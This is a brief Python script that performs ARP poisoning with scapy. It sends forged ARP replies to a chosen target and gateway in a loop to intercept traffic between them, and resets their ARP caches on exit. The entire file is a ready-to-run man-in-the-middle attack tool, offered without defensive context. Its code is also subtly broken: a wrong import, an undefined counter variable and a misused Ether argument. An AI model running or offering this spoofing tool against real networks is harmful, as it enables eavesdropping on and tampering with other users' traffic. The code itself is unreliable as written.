import scapy
import time
#importy scapy.all as scapy
import optparse
def get_mac_address(ip):
    arp_request_packet=scapy.ARP(pdst=ip)
    broadcast_packet=scapy.Ether("ff:ff:ff:ff:ff:ff")
    combined_packet=broadcast_packet/arp_request_packet
    answered_list=scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return (answered_list[0][1].hwsrc)


def arp_poisoning(target_ip,poisoned_ip):
    target_mac=get_mac_address(target_ip)

    #op=1 creates Request, op=2 creates Response
    arp_response=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)


def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac=get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False,count=6)

def get_user_input():
    parse_obj=optparse.OptionParser()
    parse_obj.add_option("-t", "--target",dest="target_ip",help="Enter TARGET IP")
    parse_obj.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")
    options = parse_obj.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")
    return options

counter=0
user_ips=get_user_input()
user_target_ip=user_ips.target_ip
user_gateway_ip=user_ips.gateway_ip

try:
    while True:

        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        count+=2
        print("\rSending packets : "+str(counter),end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\n Quit and Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)
